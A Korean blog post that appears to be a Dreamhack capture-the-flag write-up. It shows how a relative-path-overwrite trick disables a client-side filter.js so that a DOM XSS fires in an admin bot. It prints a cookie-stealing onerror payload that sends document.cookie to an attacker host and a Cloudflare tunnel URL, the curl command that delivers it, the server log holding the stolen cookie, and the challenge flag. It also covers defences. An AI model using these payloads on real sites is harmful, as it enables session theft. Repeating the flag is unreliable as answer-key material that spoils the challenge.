---
layout: post
title:  "Dreamhack 워게임 Relative Path Overwrite 풀이 — 상대경로 filter.js 가 무력화되도록 URL 모양 바꾸기"
date:   2026-05-16 21:30:00 +0900
categories: security web wargame dreamhack writeup rpo xss path-traversal
---

## 들어가며

Dreamhack 웹해킹 워게임 **Relative Path Overwrite** (id 439, 풀이자 845명+, Silver 1) 풀이입니다.

이름 그대로 **RPO (Relative Path Overwrite)** — *"브라우저가 상대경로를 어떻게 resolve 하는지"* 의 차이를 이용해, 페이지에 박힌 클라이언트사이드 보안 필터 (`filter.js`) 가 **엉뚱한 파일을 받게 만드는** 공격.

핵심은 URL 의 모양 한 줄:

```
정상:  /?page=vuln&param=X         → <script src="filter.js"> 는 /filter.js 로 resolve
공격:  /index.php/x?page=vuln&param=X  → <script src="filter.js"> 는 /index.php/filter.js 로 resolve
```

PHP Apache 는 `/index.php/x` 도 똑같이 `index.php` 를 실행 (PATH_INFO 가 `/x`) 하니까 응답은 동일한 HTML. 그러나 브라우저 입장에서 base URL 이 바뀌었기 때문에, **`filter.js` 라는 상대경로가 `/index.php/filter.js` 로 해석**되고, 거기서 받아오는 건 또 다시 `index.php` 의 HTML 응답이라 JS 로 파싱하면 SyntaxError → `filter` 변수 정의 안 됨 → 필터 검사 skip → param 의 XSS payload 가 그대로 innerHTML 에 박힘.

```bash
# 봇에게 줄 path
path='index.php/x?page=vuln&param=<img src=x onerror="location.href=\x27https://attacker/leak?c=\x27+document.cookie">'

curl -X POST "$URL/?page=report" --data-urlencode "path=$path"
# → bot 이 우리 URL 방문 → XSS 터짐 → document.cookie 가 attacker 로 redirect
```

🚩 **`DH{1461b2674a46c45172c83e27c35eea06}`**

> Note: 정보보안 입문 학습용 PoC. 실제 운영 서비스 대상 사용 금지.

---

## 1. 소스 정독

### 1-1. 라우팅 — `index.php` 가 page parameter 로 다른 PHP 를 include

```php
<?php
    $page = $_GET['page'] ? $_GET['page'].'.php' : 'main.php';
    if (!strpos($page, "..") && !strpos($page, ":") && !strpos($page, "/"))
        include $page;
?>
```

- `page` 가 있으면 거기에 `.php` 붙여서 include, 없으면 `main.php`.
- 검사: `..`, `:`, `/` 가 들어있으면 차단.
- **버그 (작은 거):** `strpos` 는 substring 이 인덱스 0 에 있을 때 `0` 을 반환, `!0` → `true`. 즉 `page=../etc` 처럼 `..` 가 0번 위치에 있으면 차단 검사 통과. 하지만 `/` 도 같은 검사를 받으니 path traversal LFI 는 못 함.

핵심 라우트:
- `?page=vuln` → `vuln.php` include
- `?page=report` → `report.php` include
- `?page=main` (또는 무인자) → `main.php`

### 1-2. `vuln.php` — DOM XSS sink 인데 client-side filter 가 막음

```html
<script src="filter.js"></script>
<pre id=param></pre>
<script>
    var param_elem = document.getElementById("param");
    var url = new URL(window.location.href);
    var param = url.searchParams.get("param");
    if (typeof filter !== 'undefined') {
        for (var i = 0; i < filter.length; i++) {
            if (param.toLowerCase().includes(filter[i])) {
                param = "nope !!";
                break;
            }
        }
    }
    param_elem.innerHTML = param;
</script>
```

`filter.js`:

```js
var filter = ["script", "on", "frame", "object"];
```

흐름:

1. `filter.js` 를 로드 → `filter` 배열 정의.
2. 인라인 스크립트가 query string 의 `param` 을 읽음.
3. `typeof filter !== 'undefined'` 면 (정의돼 있으면) 필터 단어 포함 여부 검사. 포함되면 `param = "nope !!"`.
4. `param_elem.innerHTML = param;` — 우리가 통과시킨 param 이 raw HTML 로 박힘 (innerHTML).

innerHTML 이라 `<script>` 태그 직접 실행은 안 됨 (HTML spec). 하지만 **`<img src=x onerror=...>`** 같은 inline handler 는 작동. 단, 필터에 `on` 이 있어서 `onerror` 단어가 포함되면 막힘.

**우회 조건:** `typeof filter === 'undefined'` 가 되도록 `filter.js` 로드를 무력화하면 됨.

### 1-3. `report.php` — XSS 봇 sink

```php
<?php
if(isset($_POST['path'])){
    exec(escapeshellcmd("python3 /bot.py " . escapeshellarg(base64_encode($_POST['path']))) . " 2>/dev/null &", $output);
    echo($output[0]);
}
?>
```

`bot.py`:

```python
def check_xss(path, cookie={'name': 'name', 'value': 'value'}):
    url = f'http://127.0.0.1/{path}'
    return read_url(url, cookie)

# ...
read_url 안에서:
    driver.get('http://127.0.0.1/')
    driver.add_cookie(cookie)     # flag 가 쿠키로 박힘
    driver.get(url)                # 우리가 준 path
```

봇은 `flag` 라는 이름으로 진짜 플래그 값을 쿠키 (domain 127.0.0.1) 에 박은 채 우리가 준 URL 을 selenium chrome 으로 방문. HttpOnly 명시 안 했으니 JS 가 `document.cookie` 로 읽을 수 있음.

---

## 2. 공격 — RPO 로 `filter.js` 를 무력화

### 2-1. 정상 vs 공격 URL 의 base resolution

상대경로 resolution 규칙 (RFC 3986 §5):

```
base = current document URL 의 path (마지막 segment 제거)
relative + base 에서 새 path 계산
```

**정상 URL `/?page=vuln&param=X` 의 경우:**

- 브라우저가 본 URL 의 path = `/`
- base for relative URLs = `/`
- `filter.js` → `/filter.js`
- Apache 가 `/var/www/html/filter.js` 로 응답 → 진짜 필터 JS

**공격 URL `/index.php/x?page=vuln&param=X` 의 경우:**

- Apache 는 `/index.php` 파일이 있으니 그걸로 라우팅, `x` 는 PATH_INFO.
- PHP 입장에선 `$_GET['page']='vuln'` 이라 vuln.php include — 응답 HTML 은 거의 동일.
- 그러나 **브라우저는 URL path 를 `/index.php/x` 로 인식**.
- base = `/index.php/`
- `filter.js` → `/index.php/filter.js`
- Apache 는 또 `/index.php` 실행 (PATH_INFO=`/filter.js`), `$_GET['page']` 없음 → `main.php` include.
- 응답 = `<html><head>...<h2>Welcom to rpo world</h2>...</html>`

이걸 `<script src=...>` 로 받으면 JS 파서는 `<html>` 첫 글자에서 SyntaxError → 스크립트 실행 실패. **`var filter = [...]` 가 정의되지 않음**.

### 2-2. 그러면 인라인 스크립트는?

`<script>` 태그는 각각 별개의 execution context. 첫 번째 스크립트 (filter.js) 의 SyntaxError 는 두 번째 인라인 스크립트의 실행을 막지 않는다. 두 번째 스크립트는 정상 실행:

```js
if (typeof filter !== 'undefined') {  // false (filter 미정의) → skip
    // ...
}
param_elem.innerHTML = param;  // 무조건 실행, 필터 검사 없음
```

### 2-3. payload

`onerror` 사용 가능 (`on` 단어 검사가 skip 되니까). 봇의 chrome 에 CSP 없음 (PHP/Apache 가 기본적으로 안 박음) → inline handler OK.

```
param = <img src=x onerror="location.href='https://CF_URL/leak?c='+document.cookie">
```

`location.href` 로 attacker 서버에 navigate, URL 에 `document.cookie` 박음.

### 2-4. 전체 path (봇에 줄 것)

```
index.php/x?page=vuln&param=<img src=x onerror="location.href='https://CF_URL/leak?c='+document.cookie">
```

(URL encoding 은 곧 적용)

---

## 3. attacker 서버 (Cloudflare Tunnel)

ngrok-free 의 browser warning page 함정을 피하려고 cloudflared 사용 (이전 DOM XSS writeup 참조).

```bash
mkdir -p /tmp/exfil && cd /tmp/exfil
echo 'ok' > index.html
python3 -m http.server 8765 &
cloudflared tunnel --url http://localhost:8765
# → https://anime-hispanic-crafts-gmc.trycloudflare.com
```

---

## 4. 발사

```bash
URL="http://host3.dreamhack.games:11198"
CF="https://anime-hispanic-crafts-gmc.trycloudflare.com"

PAYLOAD='<img src=x onerror="location.href=\x27'"$CF"'/leak?c=\x27+document.cookie">'
ENCODED=$(python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1]))" "$PAYLOAD")
BOT_PATH="index.php/x?page=vuln&param=$ENCODED"

curl -X POST "$URL/?page=report" --data-urlencode "path=$BOT_PATH"
```

attacker 서버 로그:

```
::1 - - [17/May/2026 01:12:39] "GET /leak?c=flag=DH{1461b2674a46c45172c83e27c35eea06} HTTP/1.1" 404 -
```

🚩 **`DH{1461b2674a46c45172c83e27c35eea06}`**

---

## 5. 왜 이게 통하는가 — 한 번 더

RPO 의 본질은 **"클라이언트가 보는 URL 의 path 와, 서버가 dispatch 하는 라우팅이 어긋남"**.

| Layer | `/?page=vuln&param=X` 일 때 | `/index.php/x?page=vuln&param=X` 일 때 |
|-------|----------------------------|----------------------------------------|
| Apache 가 실행 | `/index.php` | `/index.php` (PATH_INFO=`/x`) |
| PHP 라우팅 | vuln.php include | vuln.php include (같음) |
| 응답 HTML | 동일 | 동일 |
| **브라우저가 보는 base** | `/` | `/index.php/` |
| `<script src="filter.js">` resolve | `/filter.js` (진짜) | `/index.php/filter.js` (→ main.php 응답) |

서버와 클라이언트의 "URL 인식" 이 어긋나는 그 갭이 공격면. PHP / Java / Python 가릴 것 없이 PATH_INFO 를 받아들이는 모든 프레임워크가 이 함정 후보.

**올바른 방어:**

1. 상대경로 `<script src="filter.js">` 대신 **절대경로 `<script src="/filter.js">`** 사용. 한 글자 차이로 완전히 막힘.
2. `<base href="/">` 를 head 에 박아서 모든 상대경로의 기준을 강제.
3. Apache 측 `AcceptPathInfo Off` 또는 `RewriteRule` 로 `/index.php/...` 류 URL 거부.

---

## 6. 시도한 것 중 실패한 것들 — 회고

### 6-1. 헛수고 1 — VM credit / image pull 문제로 두 번 막힘

처음 POST `/api/.../live/` 에 `failed to pull image` 응답을 받음. 다른 VM 이 떠 있어서 credit 부족이거나, 이미지 캐시가 잠시 비어 있던 듯. **다른 문제 두어 개를 먼저 풀고 다시 와서 성공**. 인프라 issue 라 풀이와 무관하지만, 같은 image 가 두 번 연속 실패하면 **다른 문제로 잠깐 이동했다 돌아오는 패턴** 이 효율적.

### 6-2. 헛수고 2 (잠재적, 안 빠짐) — `page=` 의 LFI 가능성 추측

`!strpos($page, "..")` 가 인덱스 0 false negative 라는 점 때문에 처음에 **"LFI 로 /flag 직접 읽기 가능?"** 의심. 그러나 `/` 검사가 있어서 traversal path 자체가 불가. 그래서 RPO 라는 문제 이름대로 RPO 가 의도된 풀이.

**다음엔:** 문제 이름이 명시적 (`Relative Path Overwrite`) 인 경우 그 기법이 가장 자연스럽다. LFI 의심은 빠르게 검증한 뒤 곧바로 intended path 로.

### 6-3. (안 빠진 함정) — Apache PATH_INFO 비활성화

만약 Apache 가 `AcceptPathInfo Off` 였다면 `/index.php/x` 는 404. 이 문제는 default (On) 라 통함. 다른 환경에서는 `?` 뒤에 `;` 같은 path 파라미터를 끼우는 변형이 필요할 수도.

---

🚩 `DH{1461b2674a46c45172c83e27c35eea06}`
